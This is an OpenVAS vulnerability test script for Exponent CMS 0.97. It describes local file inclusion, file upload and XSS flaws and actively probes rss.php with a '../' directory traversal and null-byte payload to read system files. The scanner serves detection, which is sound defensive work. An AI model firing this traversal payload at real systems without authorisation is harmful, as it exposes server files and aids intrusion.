###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_exponet_cms_44095.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# Exponent CMS Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:exponentcms:exponent_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100938");
  script_version("$Revision: 13960 $");
  script_bugtraq_id(44095);
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-12-09 13:44:03 +0100 (Thu, 09 Dec 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Exponent CMS Multiple Input Validation Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_exponet_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ExponentCMS/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44095");
  script_xref(name:"URL", value:"http://www.exponentcms.org");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/lfi_in_exponent_cms.html");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/lfi_in_exponent_cms_1.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/515075");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/515076");

  script_tag(name:"summary", value:"Exponent CMS is prone to multiple input-validation vulnerabilities
  because it fails to adequately sanitize user-supplied input. These vulnerabilities include local
  file-include, information-disclosure, arbitrary-file-upload, arbitrary-file-modify, and cross-site-scripting
  vulnerabilities.");

  script_tag(name:"impact", value:"Exploiting these issues can allow an attacker to steal cookie-based
  authentication credentials, view and execute local files within the context of the webserver, upload
  arbitrary code and run it in the context of the webserver process, compromise the application, access
  or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks may also be possible.");

  script_tag(name:"affected", value:"Exponent CMS 0.97 is vulnerable. Other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/rss.php?module=" + crap(data:"../", length:3*9) + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );